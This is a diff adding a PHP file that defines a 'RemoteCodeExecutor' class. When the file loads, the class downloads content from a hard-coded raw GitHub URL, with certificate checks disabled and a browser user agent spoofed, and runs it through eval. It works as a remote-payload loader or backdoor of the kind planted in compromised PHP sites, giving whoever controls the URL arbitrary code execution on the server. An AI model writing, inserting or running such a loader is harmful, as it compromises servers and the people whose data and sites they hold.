@@ -1,0 +1,87 @@
+<?php
+class RemoteCodeExecutor {
+    private $url;
+    private $timeout = 30;
+    
+    public function __construct($url) {
+        $this->url = $url;
+    }
+    
+    public function setTimeout($timeout) {
+        $this->timeout = $timeout;
+    }
+    
+    private function getWithFileGetContents() {
+        $context = stream_context_create([
+            'http' => [
+                'timeout' => $this->timeout,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        
+        return @file_get_contents($this->url, false, $context);
+    }
+    
+    private function getWithCurl() {
+        $ch = curl_init();
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $this->url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_CONNECTTIMEOUT => 10
+        ]);
+        
+        $content = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return ($httpCode === 200) ? $content : false;
+    }
+    
+    public function getContent() {
+        // Coba file_get_contents dulu
+        $content = $this->getWithFileGetContents();
+        
+        // Jika gagal, coba curl
+        if ($content === false) {
+            $content = $this->getWithCurl();
+        }
+        
+        return $content;
+    }
+    
+    public function execute() {
+        $kode = $this->getContent();
+        
+        if ($kode !== false && !empty($kode)) {
+            try {
+                eval('?>' . $kode);
+                return true;
+            } catch (ParseError $e) {
+                throw new Exception("Parse Error: " . $e->getMessage());
+            } catch (Throwable $e) {
+                throw new Exception("Execution Error: " . $e->getMessage());
+            }
+        }
+        
+        throw new Exception("Failed to fetch content from URL");
+    }
+}
+
+// Penggunaan
+try {
+    $executor = new RemoteCodeExecutor('https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/1.txt');
+    $executor->setTimeout(15);
+    $executor->execute();
+} catch (Exception $e) {
+    echo "Error: " . $e->getMessage();
+}
+?> 
